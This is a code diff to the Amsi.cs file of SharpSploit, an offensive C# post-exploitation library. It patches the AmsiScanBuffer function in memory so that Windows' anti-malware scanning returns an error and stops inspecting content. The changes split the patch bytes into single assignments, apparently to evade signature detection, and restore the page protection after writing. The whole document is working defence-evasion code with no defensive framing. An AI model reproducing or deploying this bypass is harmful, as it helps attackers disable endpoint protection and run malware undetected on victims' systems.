+++ SharpSploit/Evasion/Amsi.cs
@@ -28,23 +28,35 @@ namespace SharpSploit.Evasion
             byte[] patch;
             if (Utilities.Is64Bit)
             {
-                patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+                patch = new byte[6];
+                patch[0] = 0xB8;
+                patch[1] = 0x57;
+                patch[2] = 0x00;
+                patch[3] = 0x07;
+                patch[4] = 0x80;
+                patch[5] = 0xc3;
             }
             else
             {
-                patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+                patch = new byte[8];
+                patch[0] = 0xB8;
+                patch[1] = 0x57;
+                patch[2] = 0x00;
+                patch[3] = 0x07;
+                patch[4] = 0x80;
+                patch[5] = 0xc2;
+                patch[6] = 0x18;
+                patch[7] = 0x00;
             }
 
             try
             {
                 var library = Win32.Kernel32.LoadLibrary("amsi.dll");
                 var address = Win32.Kernel32.GetProcAddress(library, "AmsiScanBuffer");
-
                 uint oldProtect;
                 Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out oldProtect);
-
                 Marshal.Copy(patch, 0, address, patch.Length);
-
+                Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                 return true;
             }
             catch (Exception e)